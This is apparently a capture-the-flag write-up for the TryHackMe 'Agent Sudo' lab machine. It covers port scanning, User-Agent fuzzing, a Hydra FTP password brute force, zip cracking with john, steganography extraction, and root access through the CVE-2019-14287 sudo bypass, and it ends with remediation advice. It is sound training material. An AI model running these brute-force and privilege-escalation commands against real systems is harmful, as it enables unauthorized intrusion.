# Target: Agent Sudo
**Platform:** TryHackMe
[Agent Sudo on TryHackMe](https://tryhackme.com/room/agentsudoctf)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| Agent Sudo | 10.112.139.73 | Linux | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my Reconnaissance by running the Nmap scan to check how many open ports are on the machine, what are these ports and what services are running on them.
**Nmap Scan:**
```bash
nmap -sV -vv 10.112.139.73 
```

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

This showed me three open ports with very common services running on them. Seeing that port 80 is open I immediately go to see what was on this machine page. I type IP Address of the machine into the searchbar in the browser and it showed me the white page with some text on it.

```
 Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

I inspected the source code of the page but it didn't show me anything interesting.
Next I used gobuster to find hidden directories on this machine.
**Directory Brute-forcing:**
```bash
gobuster dir -u 10.112.139.73 -w /usr/share/wordlists/dirb/common.txt
```

```
===============================================================
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
index.php            (Status: 200) [Size: 218]
server-status        (Status: 403) [Size: 278]
Progress: 4613 / 4613 (100.00%)
===============================================================
```

It didn't show me anything interesting. Based on text on white page about user-agent I used Burpsuite to intercept the request when I tried to open the page and I tried to change my user-agent to get access to the page. I set up the attack by sending request to repeater and adding § symbols in User-Agent line to set payloads there, next I loaded the payload list with all alphabet letters. Then I started the attack and after a while I've got two User-Agent names which gave more content on the page: `R` and `C`.
When I opened the page with `R` User-Agent I've got this message:
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

When I opened the page with `C` User-Agent I've got this message:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

The first message gives me information about agent name - `Chris` and that his password could be weak so this could allow me to bruteforce his password to FTP or SSH.
## Phase 2: Initial Foothold (Gaining Access)

I used Hydra tool to brute force Chris' password.
**Brute-forcing FTP Password:**
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.112.139.73
```

```
[21][ftp] host: 10.112.139.73   login: chris   password: crystal
```

After a while I've got a password to FTP - `crystal`. I used it to login to the FTP service as `chris`.
**Logging to FTP:**
```bash
ftp chris@10.112.139.73
Connected to 10.112.139.73.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
```

I listed content of current directory using `ls -la` command and this is what I got:
```
drwxr-xr-x    2 0        0            s4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

I downloaded all three files to my system, by using `get` command. Next I read the file `To_agentJ.txt`:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

This exactly indicates that the password is stored in the picture, so this is steganography. To extract this data from the current pictures I used tool `binwalk`. I dropped the FTP connection, because there was nothing more to look for, and used this tool on downloaded pictures from FTP.
**Extracting data from pictures:**
```bash
binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

This showed me exactly that file `cutie.png` was fake image with sensitive data. I extracted this data.
**Extracting data from Image:**
```bash
binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

This is what I got after extracting:
```
ls -la _cutie.png.extracted 
total 328
drwxrwxr-x 2 kali kali   4096 May 21 07:46 .
drwxrwxr-x 3 kali kali   4096 May 21 07:46 ..
-rw-rw-r-- 1 kali kali 279312 May 21 07:46 365
-rw-rw-r-- 1 kali kali  33973 May 21 07:46 365.zlib
-rw-rw-r-- 1 kali kali    280 May 21 07:46 8702.zip
-rw-r--r-- 1 kali kali     98 May 21 07:46 To_agentR.txt
```

I've got two artefact files: `365` and `365.zlib` which I could ignore. File `To_agentR.txt` contains weird text: `Fs��W�Eg�a��:�Nd��~Yd�W\_z#�H��,�����u^�a��ܺ��xK�_�v�ڂa�[Ф0���5�2a>=���|����NIi��Hl�vz�` and file `8702.zip` is containig file `To_agentR.txt` but was blocked with a password so I had to crack it.
I converted zip file to hash so it could be cracked, and then I cracked it.
**Converting zip to hash:**
```bash
zip2john 8702.zip > hash.txt 
```

**Cracking zip file password:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2026-05-21 07:58) 5.555g/s 136533p/s 136533c/s 136533C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I used this password to open locked zip file and I read the txt file.
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

The text in single quotation was encoded in base64 so I decoded it using tool `base64`.
**Decoding base64 text:**
```bash
echo "QXJlYTUx" | base64 -d
Area51
```

This was the steganography password. I used this password to extract data from the second image using tool `steghide`.
**Extracting data from second image:**
```bash
steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```

I read the file `message.txt`.
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

This gives me name of the second agent and his password. I connected to ssh using `james` username and `hackerrules!` password. After that I've got a flag which was in the plaintext file: `b03d975e8c92a7c04146cfa7a5a313c7`. There was a image too, so I downloaded it to my kali linux by using scp: `scp james@10.113.182.102:Alien_autospy.jpg .`. I opened it and I saw an alien lying down, so I revers-searched this file on Google Images, and it showed me that this was Roswell New Mexico incident. So the description of this image is: `Roswell alien autopsy`.

## Phase 3: Privilege Escalation & Post-Exploitation

I checked which command can I use as a current user.
**Checking permissions:**
```bash
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Then I searched the internet for: `sudo ALL !root bypass CVE` to find exact CVE, which was: `CVE-2019-14287`.
This showed me which command did I had to use to escalate my privileges: `sudo -u#-1 /bin/bash`.
I ran this command and the prompt changed from `james@agent-sudo:~$` to `root@agent-sudo:~#`.
**Proof of Root:**
```bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# whoami
root
```

As a root I found the root flag:
```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

## Conclusion & Takeaways

**Summary:** The assessment began with reconnaissance using Nmap, revealing open ports for HTTP, FTP, and SSH. By spoofing the web browser's User-Agent, a valid FTP username was discovered. Hydra was then used to brute-force the FTP password, granting access to the server. After finding hidden data in the photos on the server, the username and password for the SSH user were discovered. Escalating privileges to root on SSH was available because of a weak configuration of sudo commands.

**What I Learned:** 
* **HTTP Manipulation:** Modifying User-Agent headers to bypass basic web access controls.
* **Steganography:** Using tools like `binwalk` to identify hidden archives and `steghide` to extract password-protected data from image files.
* **Secure File Transfer:** Utilizing `scp` to safely download evidence and files from a compromised remote server to local machine.
* **Privilege Escalation:** Exploiting a known integer overflow vulnerability in older version of `sudo` (CVE-2019-14287) to bypass security restrictions and gain root access.

**Remediation:** To secure this machine and prevent similar attacks, I recommend the following remediations:

1. **Secure Data Handling:** Remove all sensitive information, internal notes, and credentials stored in plain text or hidden within files on public-facing servers.
2. **Enforce Password Policies:** Implement strong, complex password requirements for all external-facing services (FTP, SSH) to mitigate dictionary and brute-force attacks.
3. **Access Control & Patch Management:** Update the `sudo` package to the latest version to patch CVE-2019-14287. Additionally, audit the `sudoers` configuration to ensure low-level users are not granted excessive permissions that bypass intended security controls.


**Note:** The target IP address changes throughout this writeup (10.112.139.73 → 10.113.182.102) as the machine was completed across multiple sessions on different days.
